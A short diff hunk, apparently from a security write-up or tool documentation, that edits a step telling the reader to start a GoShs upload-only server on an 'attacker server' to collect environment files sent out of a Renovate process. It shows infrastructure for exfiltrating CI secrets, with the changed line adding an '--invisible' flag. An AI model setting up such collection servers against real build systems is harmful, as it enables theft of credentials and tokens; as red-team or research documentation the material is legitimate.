@@ -116,7 +116,7 @@ fi
 On your attacker server, start a [GoShs](https://github.com/patrickhener/goshs) server to accept the environment files from the Renovate process.
 
 ```bash
-./goshs --ssl --self-signed --upload-only -no-clipboard --no-delete --port 8000
+goshs --ssl --self-signed --upload-only --invisible --no-delete --port 8080
 INFO   [2025-09-30 09:31:29] You are running the newest version (v1.1.1) of goshs
 ```
 
